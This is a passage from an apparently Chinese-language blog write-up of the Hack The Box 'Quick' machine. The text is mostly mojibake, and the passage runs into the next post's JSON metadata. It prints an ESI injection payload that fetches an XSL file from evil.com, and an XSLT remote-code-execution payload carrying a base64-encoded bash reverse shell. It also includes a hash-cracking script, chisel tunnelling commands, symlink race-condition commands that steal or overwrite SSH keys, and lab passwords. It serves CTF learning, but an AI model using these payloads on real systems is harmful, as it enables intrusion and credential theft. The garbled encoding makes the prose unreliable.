Esigateåç›´æ¥æœç´¢ç›¸å…³ä¿¡æ¯ã€‚äº†è§£åˆ°è¿™æ˜¯ä¸€ä¸ªæ¨¡æ¿ç›¸å…³çš„javaæœåŠ¡ã€‚å¯ä»¥èµ·åˆ°æ­é…phpcmså¹¶ä¸”å°†htmlç‰‡æ®µè¿›è¡Œæ•´åˆçš„ä½œç”¨ã€‚å¹¶ä¸”è¿›ä¸€æ­¥äº†è§£åå‘ç°å­˜åœ¨RCEæ¼æ´ã€‚ æ‰¾äº†å¥½å‡ ç¯‡æ–‡ç« éƒ½æ²¡æœ‰å…³é”®ä»£ç ã€‚åªæœ‰è¿™ç¯‡æåˆ°äº†https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/ è§¦å‘çš„payloadå¦‚ä¸‹ï¼Œæ˜¾ç„¶ä¹Ÿæ˜¯å› ä¸ºå¼•å…¥äº†å¤–éƒ¨çš„æ¶æ„xslå¯¼è‡´RCEã€‚ 12&lt;esi:include src=\"http://website.com/\" stylesheet=\"http://evil.com/esi.xsl\"&gt;&lt;/esi:include&gt; è¿™é‡Œæˆ‘æ³¨æ„åˆ°å‰é¢çš„srcæ˜¯website.comæ‰€ä»¥æˆ‘åœ¨ä½¿ç”¨è‡ªå·±çš„payloadæ—¶å°†å…¶æ”¹ä¸ºäº†10.10.10.186:9001ã€‚åæ¥ä¹Ÿè¯æ˜å¦‚æœä¸æ”¹çš„è¯ï¼Œè§¦å‘æ—¶ä¼šå‡ºç°error retrieving urlçš„æŠ¥é”™ã€‚ æ¥ä¸‹æ¥åˆ™æ˜¯å°è¯•å¦‚ä½•è§¦å‘çš„é—®é¢˜ã€‚è¿™é‡Œæˆ‘æŒ‰æ‰“CTFçš„ç›´è§‰è®¤ä¸ºåº”è¯¥æ˜¯ticket.phpä¼ payload.search.phpä¼ searchå‚æ•°è¿›è¡Œè§¦å‘ã€‚å½“ç„¶ç½‘é¡µä¹Ÿæé†’äº†ï¼Œå½“ä½ ä¼ å®Œticketåä¼šè¿”å›ä¸€ä¸ªé¢„å…ˆç½®å¥½çš„ticketidã€‚åªè¦åœ¨search.phpæœç´¢å¯¹åº”idå³å¯ã€‚ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°å‘ã€‚é‚£å°±æ˜¯javaçš„å‘½ä»¤æ‰§è¡Œé—®é¢˜ã€‚å¼€å§‹å°è¯•è§¦å‘æ—¶å‘ç°ä¸»è¦é—®é¢˜æ˜¯ï¼š ä¸€ä¸ªticketä¼ ä¸€æ¬¡åå°±å¤±æ•ˆäº†ã€‚å¯¼è‡´æˆ‘æ¯æ¬¡å¾—æ›´æ”¹xslçš„åå­—ã€‚ å‘½ä»¤æ‰§è¡Œcurl 10.10.10.14.40|bashå¤±è´¥ã€‚ä¼°è®¡åˆæ˜¯javaçš„é”…ã€‚ å¦‚æœç¨å¾®è¿‡ä¸€éä¸Šé¢é‚£ç¯‡æ–‡ç« ä¸­çš„xsl.ä¼šå‘ç°è‚¯å®šæ˜¯è°ƒç”¨äº†java.lang.Runtime.getRuntime().exec()æ¥æ‰§è¡Œå‘½ä»¤çš„ã€‚æ‰€ä»¥è‚¯å®šå­˜åœ¨å•æ¡å‘½ä»¤ç‰¹æ®Šå­—ç¬¦è¿‡ä¸å»çš„é—®é¢˜ã€‚å½“ç„¶è§£å†³æ–¹æ³•åœ¨åšvulhubå„ç§javaååºåˆ—åŒ–æ—¶å°±ç”¨çƒ‚äº†ã€‚ä½¿ç”¨ç¼–ç ç»•è¿‡å³å¯ã€‚http://jackson-t.ca/runtime-exec-payloads.html æœ€åæˆ‘çš„xsl payload 123456789101112131415&lt;?xml version=\"1.0\" ?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:output method=\"xml\" omit-xml-declaration=\"yes\"/&gt;&lt;xsl:template match=\"/\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"&gt;&lt;root&gt;&lt;xsl:variable name=\"cmd\"&gt;&lt;![CDATA[bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MC85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;]]&gt;&lt;/xsl:variable&gt;&lt;xsl:variable name=\"rtObj\" select=\"rt:getRuntime()\"/&gt;&lt;xsl:variable name=\"process\" select=\"rt:exec($rtObj, $cmd)\"/&gt;Process: &lt;xsl:value-of select=\"$process\"/&gt;Command: &lt;xsl:value-of select=\"$cmd\"/&gt;&lt;/root&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; å…ˆraiseä¸€ä¸ªticketåå‡†å¤‡å¥½ç›‘å¬ï¼Œsearch.phpä¼ å€¼ç›´æ¥è§¦å‘ åˆ°æ­¤ä¸ºæ­¢å³å¯å¼¹åˆ°ç”¨æˆ·samçš„shellã€‚æ‹¿åˆ°user.txt ä¸Šé¢ä¸€å¥—æµç¨‹èµ°ä¸‹æ¥åèŠ±äº†å¿«æœ‰7ä¸ªå°æ—¶ã€‚åªèƒ½ç®—æ˜¯é…ç¯å¢ƒ(ç”šè‡³è¿˜æ²¡é…æˆ)è·ŸçŒœç”¨æˆ·åçš„é”…ã€‚ä½†åŒæ—¶ä¹Ÿè¡¨ç°å‡ºenumerationçš„è¿‡ç¨‹æœ‰å¤šé‡è¦ã€‚å¦åˆ™ç”šè‡³ä¸èƒ½æ­£å¸¸è¿›è¡Œåé¢çš„ææƒã€‚javaçš„å‘½ä»¤æ‰§è¡Œè¿™ä¸ªå°trickå¯¹äºæ–°æ‰‹è€Œè¨€ä¹Ÿè®¸å¾ˆå‘ã€‚ä½†æ˜¯ä»ç„¶æ˜¯æœ‰æ–¹æ³•çš„ã€‚æ¯”å¦‚wgetä¸€ä¸ªnetcatè¿‡å»å†æ‰§è¡Œ(windowså¸¸è§„æ“ä½œï¼Œå°¤å…¶æ˜¯åœ¨windowsdefenderæ—¥æ¸å¼ºå¤§çš„ä»Šå¤©)ã€‚å‡å¦‚ç†Ÿæ‚‰javaçš„è¯åˆ™åº”è¯¥å¾ˆå¿«å°±èƒ½æ„é€ å‡ºå¼¹shellçš„payload.ä¸è‡³äºå¡åœ¨RCEå´æ— æ³•getshell. privesc to srvadmå¾—åˆ°ç”¨æˆ·samåå‡†å¤‡å¼€å§‹ææƒã€‚é¦–å…ˆæ˜¯å¸¸è§„çš„linpeas.shä¼ åˆ°é¶æœºä¸Šæ‰«ä¸€éã€‚æ¥ç€æ˜¯python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;ç»´æŒshell.æ¯•ç«Ÿä¸€å¥—æµç¨‹ä¸‹æ¥getshellä¹Ÿä¸æ˜¯é‚£ä¹ˆè¿…é€Ÿçš„ã€‚(å½“ç„¶å¯ä»¥å†™ä¸ªsshå…¬é’¥ï¼Œå°±æ˜¯æˆ‘æå¿˜äº†2333) è„šæœ¬æ‰«è¿‡ä¸€éåå¹¶æ²¡æœ‰ä»€ä¹ˆæ”¶è·ã€‚å€’æ˜¯åœ¨htmlçš„æºç é‡Œæ‰¾åˆ°äº†phpçš„db.phpæ³„éœ²äº†æ•°æ®åº“ä¿¡æ¯ 123&lt;?php$conn = new mysqli(\"localhost\",\"db_adm\",\"db_p4ss\",\"quick\");?&gt; ç™»å½•mysqlä»usersè¡¨é‡Œæ‹¿åˆ°ä¸¤ä¸ªç”¨æˆ·åŠå„è‡ªå¯†ç çš„hash 12| Elisa | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d || Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 | æ­¤æ—¶é¶æœºè¿˜å‰©ä¸‹ä¸€ä¸ªè¦ææƒçš„ç”¨æˆ·srvadmã€‚è¿™é‡Œæ³„éœ²äº†å¯†ç ï¼Œå½“ç„¶è¦å»phpæºç é‡Œçœ‹çœ‹å¯†ç æ˜¯æ€ä¹ˆä¸hashè¿›è¡Œå¯¹æ¯”çš„login.phpä¸­ 1password=md5(crypt($password,'fa')) æ—¢ç„¶ç›å€¼ä»¥åŠåŠ å¯†éƒ½ä¸ç®—éš¾ã€‚æˆ‘ä»¬ç›´æ¥ç”¨è„šæœ¬+rockyou.txtæ¥è¯•è¯•çˆ†ç ´ 1234567891011121314151617181920import cryptimport hashlibdef get_md5(s): md = hashlib.md5() md.update(s.encode('utf-8')) return md.hexdigest()f=open('rockyou.txt','r')for i in range(1,10000000): try: word=f.readline().strip() except: continue hashes=crypt.crypt(word,'fa') cipher=get_md5(hashes) if cipher=='e626d51f8fbfd1124fdea88396c35d05': print('Found: '+word) break å¾—åˆ°srvadmçš„å¯†ç åå½“ç„¶å…ˆè¯•è¯•çœ‹æ˜¯ä¸æ˜¯sshæˆ–è€…ç³»ç»Ÿå¯†ç äº†ã€‚ä½†å¾ˆå¯æƒœéƒ½ä¸æ˜¯ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œè¿™ä¸ªå¯†ç åªèƒ½åœ¨webæœåŠ¡ä¸Šå‘æŒ¥ä½œç”¨äº†ã€‚é‚£ä¹ˆè¯´è¿˜æœ‰å…¶ä»–webæœåŠ¡ï¼Ÿ è¿™æ—¶æˆ‘æ³¨æ„åˆ°äº†/var/www/é‡Œé™¤äº†htmlè¿˜æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹ è¯¡å¼‚çš„æ˜¯jobsæ˜¯777æƒé™ã€‚ä¼¼ä¹å¯ä»¥åšæ–‡ç« ã€‚é‚£ä¹ˆè½¬è€Œå»æ—è¾¹çš„printerä¸­æ‰¾ã€‚å‘ç°åˆæ˜¯ä¸€å¥—å¸¦äº†cmsçš„phpæºç ã€‚å¹¶ä¸”ç”¨çš„æ•°æ®åº“è·Ÿä¹‹å‰htmlä¸­çš„æ˜¯ä¸€è‡´çš„ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çˆ†ç ´å‡ºçš„å¯†ç æœ‰ç”¨äº†ã€‚ ç®€å•å®¡ä¸‹åå‘ç°ä¸€ä¸ªä¼¼ä¹å­˜åœ¨æ¼æ´çš„åœ°æ–¹(å®é™…ä¸Šå½“æ—¶å…³æ³¨ç‚¹é”™äº†)job.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phprequire __DIR__ . '/escpos-php/vendor/autoload.php';use Mike42\\Escpos\\PrintConnectors\\NetworkPrintConnector;use Mike42\\Escpos\\Printer;include(\"db.php\");session_start();if($_SESSION[\"loggedin\"])&#123; if(isset($_POST[\"submit\"])) &#123; $title=$_POST[\"title\"]; $file = date(\"Y-m-d_H:i:s\"); file_put_contents(\"/var/www/jobs/\".$file,$_POST[\"desc\"]); chmod(\"/var/www/printer/jobs/\".$file,\"0777\"); $stmt=$conn-&gt;prepare(\"select ip,port from jobs\"); $stmt-&gt;execute(); $result=$stmt-&gt;get_result(); if($result-&gt;num_rows &gt; 0) &#123; $row=$result-&gt;fetch_assoc(); $ip=$row[\"ip\"]; $port=$row[\"port\"]; try &#123; $connector = new NetworkPrintConnector($ip,$port); sleep(0.5); //Buffer for socket check $printer = new Printer($connector); $printer -&gt; text(file_get_contents(\"/var/www/jobs/\".$file)); $printer -&gt; cut(); $printer -&gt; close(); $message=\"Job assigned\"; unlink(\"/var/www/jobs/\".$file); &#125; catch(Exception $error) &#123; $error=\"Can't connect to printer.\"; unlink(\"/var/www/jobs/\".$file); &#125; &#125; else &#123; $error=\"Couldn't find printer.\"; &#125; &#125;?&gt;&lt;?php &#125; else&#123; echo '&lt;script&gt;alert(\"Invalid Username/Password\");window.location.href=\"index.php\";&lt;/script&gt;';&#125;?&gt; å…¶ä¸­ç”¨åˆ°çš„æ¡†æ¶çš„éƒ¨åˆ†ç»æœç´¢åå‘ç°åªæ˜¯ä¸€ä¸ªç±»ä¼¼â€˜æ‰“å°â€™åŠŸèƒ½çš„æ¡†æ¶ã€‚æ¯”å¦‚NetworkPrintConnectorå°±æ˜¯è°ƒç”¨äº†ä¸€ä¸ªfsockopen()ã€‚ æ¥ä¸‹æ¥çš„éƒ¨åˆ†å°±æ˜¯æœ€è®©æˆ‘å¤´ç–¼çš„éƒ¨åˆ†ã€‚å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ç»éªŒä¸è¶³å§ã€‚ç°åœ¨æ—¢ç„¶è¦ææƒï¼Œå¹¶ä¸”æœ‰å­˜åœ¨æ¼æ´çš„webæœåŠ¡äº†ï¼Œé‚£ä¹ˆå®ƒè‚¯å®šå¾—æ˜¯srvadmè¿è¡Œçš„ï¼Œæ‰èƒ½è®©æˆ‘æœ‰ææƒæœºä¼šã€‚ç„¶è€Œæˆ‘åœ¨æ‰¾æœåŠ¡è¿™é‡Œå´æµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼šå¼€å§‹çœ‹ç«¯å£å‘ç°æœ‰80ç«¯å£ï¼Œäºæ˜¯ç›´æ¥curl.å¾—åˆ°çš„å´æ˜¯ä¹‹å‰9001ç«¯å£çš„php+esigateé¡µé¢ã€‚å¯¼è‡´æˆ‘ä»¥ä¸º80ç«¯å£è¿è¡Œçš„æ˜¯nginxç»™javaåšçš„åä»£ã€‚ä¹‹åæŠŠé¶æœºç«¯å£å…¨è¿‡äº†ä¸€éä¹Ÿæ²¡æœ‰æ‰¾åˆ°å“ªä¸ªç«¯å£æ˜¯è·‘çš„printerçš„webæœåŠ¡ã€‚ç”šè‡³ä¹Ÿæ²¡æ‰¾åˆ°srvadmåœ¨è¿è¡Œä»€ä¹ˆæœåŠ¡çš„ä¿¡æ¯ã€‚å¯¼è‡´è‡ªå·±ç¬é—´è¿·èŒ«ã€‚ ä¹‹ååœ¨è¿™å—è¯¢é—®äº†ä¸‹å¤–å›½å‹äººbigFish43ã€‚ä»–ç»™æˆ‘çš„æç¤ºæ˜¯æŸ¥çœ‹ä¸‹apacheçš„configæ–‡ä»¶ã€‚äºæ˜¯æ€è·¯ç¬é—´æ˜æœ—èµ·æ¥ã€‚åœ¨sites-enabled/000-default.confé‡Œæ‰¾åˆ°äº†å­åŸŸåprinterv2.quick.htbå¹¶ä¸”æ­£å¦‚æ‰€é¢„æ–™çš„ï¼Œæ˜¯ä»¥srvadmç”¨æˆ·è¿è¡Œçš„ã€‚ apacheçš„virtualhostè·‘åœ¨80ç«¯å£ä¸Šã€‚ä¸è¿‡åŒæ—¶æˆ‘ä»¬çŸ¥é“htmlæ–‡ä»¶å¤¹é‡Œçš„çš„æœåŠ¡ä¹Ÿè·‘åœ¨80ç«¯å£ä¸Šã€‚é‚£ä¹ˆéœ€è¦æ›´æ”¹Hostæ‰èƒ½è®¿é—®é¶æœºä¸Šcurl localhost -H &#39;Host: printerv2.quick.htb&#39;åç»ˆäºå¾—åˆ°äº†æ¥è‡ªprinterçš„å›æ˜¾ã€‚é‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯ï¼Œä¸ºäº†ç›´æ¥åœ¨æœ¬åœ°è®¿é—®åˆ°printerv2.quick.htbï¼Œå¿…é¡»è¦è¿›è¡Œç«¯å£è½¬å‘äº†ã€‚å› ä¸ºæˆ‘ä»¬æœ€æ—©nmapæ¢æµ‹80ç«¯å£æ—¶æ˜¯æ²¡æœ‰å¼€å¯çš„ã€‚è¯´æ˜è¿™é‡ŒapacheæœåŠ¡æ˜¯è¿è¡Œåœ¨æœ¬åœ°çš„ã€‚ è½¬å‘ç«¯å£åŒæ ·ä¹Ÿæœ‰è‡³å°‘ä¸¤ç§æ–¹æ³•ã€‚sshæˆ–è€…ä¸Šå·¥å…·chiselã€‚è¿™é‡Œæˆ‘æ²¡æœ‰ç”¨sshç™»å½•ï¼Œæ‰€ä»¥ç›´æ¥ç”¨chiselã€‚chiselä¹‹å‰åšsniperä¹Ÿç”¨è¿‡äº†ã€‚è¿™é‡Œç›´æ¥ç•™ä¼ å®Œchiselåçš„å‘½ä»¤ 12345#kali./chisel_linux_amd64 server -p 8000 --reverse#sam@quick./chisel_linux_amd64 client 10.10.14.40:8000 R:80:127.0.0.1:80 æ„æ€å°±æ˜¯ï¼Œé¶æœºå€Ÿç”¨8000ç«¯å£çš„ä¸­è½¬ï¼ŒæŠŠé¶æœºçš„80ç«¯å£è½¬åˆ°kaliçš„127.0.0.1:80å³æœ¬åœ°80ç«¯å£. è¿™æ ·å°±æŠŠ80ç«¯å£è½¬å‘åˆ°æœ¬åœ°äº†ã€‚æ¥ä¸‹æ¥ç”±äºè¦ä¿®æ”¹hostnameã€‚å› ä¸ºä¸æƒ³å½±å“è®¿é—®ä¹‹å‰çš„ç½‘å€ã€‚ç›´æ¥å¼€ä¸ªburpæ¥ä¿®æ”¹Host header.åªè¦ä¿æŒburpæ‰“å¼€ï¼Œæˆ‘ä»¬æ¯æ¬¡è®¿é—®çš„Hostéƒ½ä¼šè¢«æ›¿æ¢.å³å¯åœ¨æœ¬åœ°è®¿é—®è¿›è¡Œæ“ä½œã€‚ æ¥ä¸‹æ¥å°±æ˜¯æ¸—é€çš„éš¾ç‚¹äº†ã€‚å‰é¢æåˆ°è¯´job.phpçœ‹èµ·æ¥æœ‰æ¼æ´ï¼Œä½†ç©¶ç«Ÿæ¼æ´åœ¨å“ªï¼Ÿå¼€å§‹æˆ‘è§‰å¾—æœ‰æ¼æ´æ˜¯å› ä¸ºé‡Œé¢å‡ºç°äº†chmod(xxx,777)ã€‚ä½†ä»”ç»†ä¸€çœ‹å´å‘ç°é‚£ä¸ª/var/www/printer/jobsè·¯å¾„ä¸å­˜åœ¨ï¼Ÿæ—¢ç„¶å¦‚æ­¤ï¼Œä»£ç é€»è¾‘å°±æ˜¯ï¼š æ¥å—æˆ‘ä»¬postçš„å‚æ•°ï¼Œæ‰§è¡Œfile_put_contents()åœ¨/var/www/jobså†™å…¥ä¸€ä¸ªæ–‡ä»¶åä¸ºå½“å‰æ—¥æœŸçš„æ–‡ä»¶ã€‚å¹¶ä¸”chmodä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚ æ‰§è¡ŒsqlæŸ¥è¯¢ã€‚å‡å¦‚jobsåº“é‡Œæœ‰å†…å®¹ã€‚æŒ‰ç…§æŸ¥è¯¢ç»“æœè¿œç¨‹è¿æ¥åˆ°å¯¹åº”çš„ip,port.sleep(0.5)åæ‰§è¡Œfile_get_contents()è¯»æˆ‘ä»¬ä¹‹å‰çš„æ–‡ä»¶ï¼Œå¹¶æœ€ååˆ é™¤;jobsåº“æ— å†…å®¹ç›´æ¥é€€å‡ºã€‚ è¿™é‡Œå¡äº†å¥½ä¹…åæˆ‘çªç„¶æƒ³èµ·æ¥/var/www/jobsæ–‡ä»¶å¤¹æ˜¯777æƒé™ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å†™æ–‡ä»¶è¿™ç‚¹å°±éå¸¸é‡è¦ã€‚äºæ˜¯ç«‹åˆ»å°±æœ‰äº†ä¸¤ç§ä½¿ç”¨çŸ­é“¾æ¥çš„æ¡ä»¶ç«äº‰ ä¸è¦åœ¨æ•°æ®åº“ä¸­æ’å…¥æ–°æ•°æ®ã€‚è¿™æ ·srvadmåˆ›å»ºçš„æ–‡ä»¶å°±ä¼šç•™ä¸‹æ¥ã€‚å¦‚æœæˆ‘ä»¬æå‰åˆ›å»ºä¸€ä¸ªåŒåæ–‡ä»¶(å› ä¸ºæ–‡ä»¶åä¸ºæ—¶é—´è¿™ç‚¹æ˜¯å¯é¢„æµ‹çš„)ã€‚å¹¶åˆ©ç”¨çŸ­é“¾æ¥å°†å…¶é“¾æ¥å‘srvadmçš„sshkey.é‚£ä¹ˆæ‰§è¡Œfile_put_contents()æ—¶ä¸å°±å¯ä»¥å†™å…¥æˆ‘ä»¬è‡ªå·±çš„å…¬é’¥äº†å—ï¼Ÿ åœ¨å‰é¢printer.phpå°±è¾“å…¥hostè·Ÿport.å³åœ¨æ•°æ®åº“æ’å…¥æ•°æ®ã€‚è¿™æ ·job.phpå°±ä¼šè¿›è¡Œè¯»æ–‡ä»¶å¹¶æ‰“å°å†…å®¹ã€‚è€Œæˆ‘ä»¬å¯ä»¥ç”¨ncæ¥æ”¶ã€‚åªè¦åœ¨å†™æ–‡ä»¶è·Ÿè¯»æ–‡ä»¶çš„é—´éš”ä¸­åˆ æ‰æ–‡ä»¶å¹¶å»ºç«‹ä¸€ä¸ªåˆ°sshç§é’¥çš„çŸ­é“¾æ¥ã€‚phpå°±ä¼šæŠŠè¯»åˆ°çš„ç§é’¥å‘ç»™æˆ‘ä»¬ã€‚ è¿™é‡Œä¸¤ç§æ€è·¯åŒæ—¶æƒ³åˆ°ï¼Œæˆ‘ç«‹åˆ»é€‰æ‹©äº†å‰è€…ã€‚å› ä¸ºåè€…ç®—æ¯”è¾ƒçº¯ç²¹çš„æ¡ä»¶ç«äº‰,æ—¶é—´ä¸å¥½æŠŠæ§(æ‰€ä»¥å«Quick)ï¼Œæˆ‘é€‰æ‹©å‰è€…ã€‚ æ“ä½œèµ·æ¥æ¯”æƒ³è±¡ä¸­ç®€å•ã€‚æˆ‘ä¸€æ¬¡å°±æˆäº†ã€‚å‡å¦‚åŒæ—¶åšé¶æœºçš„äººæ¯”è¾ƒå¤šçš„è¯å°±å¦è°ˆï¼Œå…¶å®å°±æ˜¯ç®—å¥½ä¸€ä¸ªæå‰é‡ã€‚å¹¶ä¸”æ‰§è¡Œ 1ln -s /home/srvadm/.ssh/authorized_keys 2020-06-23_06:00:00 ç„¶åå·®ä¸å¤šç®—å¥½æ—¶é—´æå‰burpé‡å¤å‘åŒ…ã€‚è¿™é‡Œå› ä¸ºç²¾åº¦è¢«é™åˆ¶åœ¨1s.æ‰€ä»¥å†™å…¥æˆ‘ä»¬çš„keyçš„å¯èƒ½æ€§ä¸å°ã€‚ ä¹‹åç›´æ¥sshç™»å½•å³å¯ 12chmod 600 id_rsassh -i id_rsa srvadm@10.10.10.186 è¿™é‡Œæˆ‘è™½ç„¶æ²¡è¯•ç¬¬äºŒç§æ€è·¯ï¼Œä½†åšå®Œé¶æœºåçœ‹åˆ°å…¶ä»–äººçš„wpé‡Œå†™åˆ°äº†è§£å†³æ–¹æ³•: æ‰§è¡Œä¸€ä¸ªbashscript 123456789cd &#x2F;var&#x2F;www&#x2F;jobs;while true;do for file in $(ls .); do rm -rf $file; ln -s &#x2F;home&#x2F;srvadm&#x2F;.ssh&#x2F;id_rsa $file; donedone ç„¶åèµ·ä¸€ä¸ªncç›‘å¬ã€‚å¹¶åœ¨job.phpæäº¤å†…å®¹å†™å…¥ã€‚è¿™æ ·å°±èƒ½å¾—åˆ°ç§é’¥å¹¶ä¸”ç›´æ¥ç™»å½•äº†ã€‚ è¿™æ®µå†…å®¹å…¶å®èŠ±çš„æ—¶é—´ä¸æ¯”ç¬¬ä¸€éƒ¨åˆ†å°‘ã€‚ç”šè‡³äºæˆ‘é‡åˆ°çš„å›°éš¾æ›´å¤šã€‚æ¯”å¦‚åœ¨æ‰¾æœåŠ¡ä¸Šå¤ªå‚»äº†ã€‚ä¹‹åæƒ³èµ·è¿è¡Œpspy64sæ—¶ä¹Ÿå‘ç°äº†ç³»ç»Ÿæ˜¯æœ‰apacheæœåŠ¡è·‘ç€çš„ã€‚é‚£è‚¯å®šå°±å¾—å»æ‰¾é…ç½®æ–‡ä»¶ã€‚ç»“æœè‡ªå·±åªçœ‹äº†apacheçš„apache2.confå°±äº†äº‹äº†ã€‚è¯¥æ‰“ã€‚ç„¶åå°±æ˜¯åé¢çš„æ¼æ´åˆ©ç”¨ã€‚é‚£ä¸ªchmodç€å®å®³äººï¼Œå¼€å§‹è¿˜æƒ³ç€æŠŠçŸ­é“¾æ¥é“¾åˆ°é‚£ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚ä»”ç»†ä¸€æƒ³æ‰å‘ç°å…¶å®ç›´æ¥é“¾åˆ°keyå°±å¯äº†ã€‚ privesc to rootåˆ°rootçš„éƒ¨åˆ†æ‰æ˜¯çœŸæ­£çš„Quickã€‚åªéœ€è¦å¾…åœ¨è‡ªå·±çš„homeæ–‡ä»¶å¤¹è¿›è¡Œenumå³å¯ã€‚ è¿™é‡ŒæŒ‰ç…§sshkeyçš„åˆ›å»ºæ—¶é—´ï¼Œæ‰¾ä¸€ä¸‹3-21ä¹‹å‰ä¸€ä¸ªæœˆä¸åˆ°çš„æ–‡ä»¶ã€‚ 1234567891011121314srvadm@quick:/home/srvadm# find . -type f -newermt \"2020-03-01\" ! -newermt \"2020-03-21\" -ls 2&gt;/dev/null 281794 4 -rw-r--r-- 1 srvadm srvadm 4038 Mar 20 06:23 ./.cache/conf.d/printers.conf 281793 8 -rw-r--r-- 1 srvadm srvadm 4569 Mar 20 06:20 ./.cache/conf.d/cupsd.conf 281799 72 -rw-rw-r-- 1 srvadm srvadm 71479 Mar 20 06:46 ./.cache/logs/debug.log 281798 4 -rw-rw-r-- 1 srvadm srvadm 1136 Mar 20 06:39 ./.cache/logs/error.log 281791 12 -rw-r--r-- 1 srvadm srvadm 9064 Mar 20 06:19 ./.cache/logs/cups.log 281425 0 -rw-r--r-- 1 srvadm srvadm 0 Mar 20 02:38 ./.cache/motd.legal-displayed 281369 4 -rw-r--r-- 1 srvadm srvadm 220 Mar 20 02:16 ./.bash_logout 281797 4 -rw------- 1 srvadm srvadm 23 Mar 20 06:46 ./.local/share/nano/search_history 281421 4 -rw-r--r-- 1 srvadm srvadm 222 Mar 20 02:38 ./.ssh/known_hosts 281418 4 -rw------- 1 srvadm srvadm 1679 Mar 20 02:37 ./.ssh/id_rsa 281419 4 -rw-r--r-- 1 srvadm srvadm 394 Mar 20 02:37 ./.ssh/id_rsa.pub 281370 4 -rw-r--r-- 1 srvadm srvadm 3771 Mar 20 02:16 ./.bashrc 281371 4 -rw-r--r-- 1 srvadm srvadm 807 Mar 20 02:16 ./.profile ä¸€ä¸ªä¸ªè¯»åå‘ç°å…³é”®ä¿¡æ¯åœ¨./.cache/conf.d/printers.conf 1DeviceURI https://srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb/printer ä¹‹å‰å­¦ssrfæ—¶æ€»ç»“è¿‡urlçš„å±æ€§ã€‚username:password@hostçš„æ ¼å¼å‘Šè¯‰äº†æˆ‘ä»¬&amp;ftQ4K3SGde8?å¯†ç ã€‚æ‰€ä»¥ç›´æ¥å°è¯•suåˆ°rootã€‚ç›´æ¥æ‹¿åˆ°rootshell. sshä¹Ÿæ˜¯åŒæ · summaryæœ¬æ¬¡æ¸—é€å‰åèŠ±äº†ä¸å°‘æ—¶é—´ã€‚ç›¸æ¯”ä¹‹å‰çœ‹ippsecè§†é¢‘åšé€€å½¹é¶æœº,ç‹¬ç«‹å®Œæˆä¸€å°å›°éš¾é¶æœºçœŸçš„æ„Ÿè§‰å¾ˆä¸é”™ï¼Œä¹Ÿå¾ˆè‰°è¾›ã€‚å½“ç„¶ï¼Œèƒ½å®Œæ•´åšå®Œå¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºè¿™å°é¶æœºçš„å†…å®¹å¾ˆé€‚åˆCTFçš„webé€‰æ‰‹ã€‚è‡ªå·±åœ¨å¾ˆå¤šåœ°æ–¹ä¹Ÿéƒ½è¿ç”¨åˆ°äº†è‡ªå·±æ—¥å¸¸æ¯”èµ›æ—¶çš„å°æŠ€èƒ½ã€‚åŒæ—¶é¶æœºå…³äºhttp/3,xslt-&gt;RCE,ææƒæ–¹æ³•ç­‰ç­‰éƒ½æœ‰å¾ˆå¤§æ”¶è·ã€‚æ‰€ä»¥éå¸¸èµã€‚ å…¶å®å‰å‰åååšäº†å¿«20å¤šå°HTBé¶æœº,æ„Ÿè§‰è‡ªå·±ç»å¸¸å¡åœ¨enumerationä¹Ÿå°±æ˜¯æšä¸¾(ä¿¡æ¯æ”¶é›†)ä¸Šã€‚è€Œè¿™å¾€å¾€æ˜¯è§£å†³é—®é¢˜çš„å…³é”®ã€‚å¸Œæœ›èƒ½å¤Ÿå¤šé”»ç‚¼ä¸‹è‡ªå·±è¿™æ–¹é¢çš„èƒ½åŠ›å§ã€‚","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"},{"name":"Linux","slug":"Linux","permalink":"https://www.bycsec.top/tags/Linux/"}]},{"title":"åˆæ¢Redis-wdbç„æ­¦ç»„ssrfme&pwnhubå…¬å¼€èµ›","slug":"åˆæ¢Redis-wdbç„æ­¦ç»„ssrfme&pwnhubå…¬å¼€èµ›","date":"2020-05-30T14:11:48.000Z","updated":"2021-02-18T05:08:25.481Z","comments":true,"path":"2020/05/30/åˆæ¢Redis-wdbç„æ­¦ç»„ssrfme&pwnhubå…¬å¼€èµ›/","link":"","permalink":"https://www.bycsec.top/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/","excerpt":"æœ¬å­¦æœŸæœ€åä¸€ç¯‡æ–‡ç« ã€‚å†™å®Œå°±è¦å¤ä¹ å»äº†ã€‚ æ–‡ç« å†™åœ¨RCTFç¬¬ä¸€å¤©ã€‚webç‹—çœŸå®è‡ªé—­.æœ¬æ¥æƒ³æŠŠå‡æœŸå‰æœ€åä¸€ç¯‡æ–‡ç« 